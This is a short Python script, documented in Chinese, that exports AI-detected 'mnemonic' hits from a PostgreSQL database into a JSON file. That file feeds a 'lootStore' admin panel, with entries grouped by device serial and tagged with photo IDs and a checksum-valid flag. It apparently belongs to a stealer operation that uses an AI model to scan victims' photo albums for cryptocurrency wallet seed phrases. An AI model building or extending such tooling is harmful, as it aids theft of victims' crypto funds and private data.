#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""export_ai_hits_json.py — 把 PG 里 AI 模型识别命中导出为内存层数据文件

数据流：tools/ds_mnemonic_scan.py（DeepSeek flash 扫描相册）→ PG mnemonics（ukey='ai:%'，
app_type='AI模型识别'）→ 本脚本导出 adm888app/data/ai_mnemonic_hits.json →
lootStore 内存层注入（面板「助记词」栏直接展示，来源=AI模型识别）。

幂等：每次全量重写（原子 tmp+rename），文件很小（命中量级=百）。
"""
import os, json, time
import psycopg2

BASE = '/www/wwwroot/i.131422.com'
OUT = os.path.join(BASE, 'adm888app', 'data', 'ai_mnemonic_hits.json')
c = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json'), encoding='utf-8'))
conn = psycopg2.connect(host=c['host'], port=c['port'], user=c['user'], password=c['password'], dbname=c['database'])
cur = conn.cursor()
cur.execute("""
  SELECT serial, plain, ts, data->>'photo_id', data->>'checksum_ok'
  FROM mnemonics WHERE ukey LIKE 'ai:%' ORDER BY id
""")
rows = cur.fetchall()
conn.close()

out = {}
for serial, plain, ts, pid, ck in rows:
    if not serial or not plain:
        continue
    out.setdefault(serial, []).append({
        'words': str(plain), 'ts': int(ts or 0),
        'photo_id': int(pid) if (pid or '').isdigit() else 0,
        'checksum_ok': (ck == 'true'),
    })

tmp = OUT + '.tmp'
with open(tmp, 'w', encoding='utf-8') as f:
    json.dump(out, f, ensure_ascii=False)
os.replace(tmp, OUT)
os.chmod(OUT, 0o644)
print('[ai-export] %d 台设备 / %d 条 AI 命中 → %s' % (len(out), sum(len(v) for v in out.values()), OUT))
